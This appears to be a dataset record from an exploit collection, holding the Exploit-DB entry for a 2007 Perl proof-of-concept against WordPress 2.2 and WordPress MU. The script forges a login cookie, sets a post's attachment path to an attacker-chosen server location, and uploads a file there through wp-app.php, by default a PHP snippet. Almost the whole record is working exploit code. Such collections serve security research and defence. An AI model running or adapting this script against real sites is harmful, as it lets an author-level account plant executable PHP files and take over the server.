{
  "id": "4113",
  "title": "WordPress Core 2.2 - &#039;wp-app.php&#039; Arbitrary File Upload",
  "cve": null,
  "vuln_type": "file_upload",
  "code": "#!/usr/bin/env perl\r\n\r\n# Wordpress 2.2 and Wordpress MU <= 1.2.2 Arbitrary File Upload PoC\r\n#\r\n# Credits : Alexander Concha <alex at buayacorp dot com>\r\n# Website : http://www.buayacorp.com/\r\n# Advisory: http://www.buayacorp.com/files/wordpress/wordpress-advisory.html\r\n\r\nuse Digest::MD5 qw(md5_hex);\r\nuse LWP::UserAgent;\r\n\r\nmy $ua = new LWP::UserAgent;\r\nmy $blog        = $ARGV[0];\r\nmy $user        = $ARGV[1];\r\nmy $pass        = $ARGV[2];\r\nmy $remote_file = $ARGV[3];\r\nmy $local_file  = $ARGV[4];\r\nmy $post_id     = $ARGV[5];\r\n\r\nif (@ARGV < 4) {\r\n       print \"\\nUsage:\\n\";\r\n       print \" wp-file-upload.pl <host> <username> <password> <remote_filename> [local_file] [post_id]\\n\\n\";\r\n       print \" <host>        - full path to WordPress. http://victim.com/wordpress/\\n\";\r\n       print \" <username>    - valid username with any of these roles: author, editor, administrator\\n\";\r\n       print \" <password>    - valid password for the user\\n\";\r\n       print \" <remote_file> - full path to the remote file. /home/vulnerable.com/wordpress/wp-content/uploads/foo.php\\n\";\r\n       print \" [local_file]  - file to upload\\n\";\r\n       print \" [post_id]     - every time this script is executed creates a new post, specify a post_ID if you already run it\\n\\n\";\r\n       exit();\r\n}\r\n$ua->requests_redirectable([]);\r\n$blog =~ s/\\/*$/\\//;\r\n\r\n$url = 'wp-app.php';\r\nif ( 200 != $ua->head($url . '?action=/service')->code ) {\r\n       $url = 'app.php';\r\n       die \"\\nIt seems that this WP installation is not vulnerable: app.php and wp-app.php were not found.\\n\"\r\n               unless 200 == $ua->head($url . '?action=/service')->code;\r\n}\r\n\r\n$auth_cookie = get_auth_cookie();\r\n\r\nsub LWP::UserAgent::simple_request {\r\n       my($self, $request, $arg, $size) = @_;\r\n       $request->header('Cookie' => $auth_cookie);\r\n       $request->content_type('image/gif') if $request->method eq \"PUT\";\r\n       $request->uri($blog . $request->uri);\r\n\r\n       $self->_request_sanity_check($request);\r\n       my $new_request = $self->prepare_request($request);\r\n       $response = $self->send_request($new_request, $arg, $size);\r\n\r\n       print $request->method . \" \" . $request->uri . \" \" . $response->code . \"\\n\";\r\n\r\n       return $response;\r\n}\r\n\r\nsub get_contents {\r\n       $file = shift;\r\n       if ( -e $file ) {\r\n               open FILE, $file or die(\"Invalid local file\");\r\n               $file = join('', <FILE>);\r\n               close FILE;\r\n       } else {\r\n               $file = <<PHP;\r\n<?php echo \"Hello World!\"; ?>\r\nPHP\r\n       }\r\n       return $file;\r\n}\r\nsub get_auth_cookie {\r\n       $response = $ua->head('wp-login.php?logout');\r\n       if ( $response->headers->header('Set-Cookie') =~ m/wordpress(user|pass)(.*?)=/ ) {\r\n                       return \"wordpressuser$2=$user;wordpresspass$2=\".md5_hex(md5_hex($pass));\r\n       }\r\n       return '';\r\n}\r\nif (0 == $post_id) {\r\n       $response = $ua->get('wp-admin/post-new.php');\r\n       die (\"\\nInvalid credentials or blog url.\\n\\n\" . $response->as_string) unless 200 == $response->code;\r\n\r\n       if ( $response->content =~ m/name=._wpnonce. value=.([a-z\\d]{10})./ ) {\r\n               $response = $ua->post('wp-admin/post.php', [\r\n                       '_wpnonce' => $1,\r\n                       'action' => 'post',\r\n                       'post_ID' => $post_id,\r\n                       'post_type' => 'post',\r\n                       'post_title' => 'foo',\r\n                       'metakeyselect' => '#NONE#',\r\n                       'metakeyinput' => '_wp_attached_file',\r\n                       'metavalue' => $remote_file\r\n                       ], 'Cookie' => $auth_cookie);\r\n\r\n               # Checks for post-new.php?posted=post_ID\r\n               if ( $response->headers->header('Location') =~ m/posted=(\\d+)/ ) {\r\n                       $post_id = $1;\r\n               }\r\n       }\r\n}\r\ndie \"\\nCould not get a valid post_id value.\\n\" unless 0 != $post_id;\r\n\r\n$request = HTTP::Request->new(PUT => $url . '?action=/attachment/file/'.$post_id);\r\n$request->content(get_contents($local_file));\r\n$response = $ua->request($request);\r\n\r\nif ( 200 == $response->code ) {\r\n       print \"\\nIt seems that the file has been posted successfully... :P\\n\";\r\n       print \"Use the following value to update the remote file: post_id '$post_id'\\n\";\r\n} else {\r\n       print \"\\nError: there is no attachment metadata for post_id=$post_id\\n\\n\" . $response->as_string() . \"\\n\";\r\n}\r\n\r\n# milw0rm.com [2007-06-26]",
  "url": "https://www.exploit-db.com/exploits/4113"
}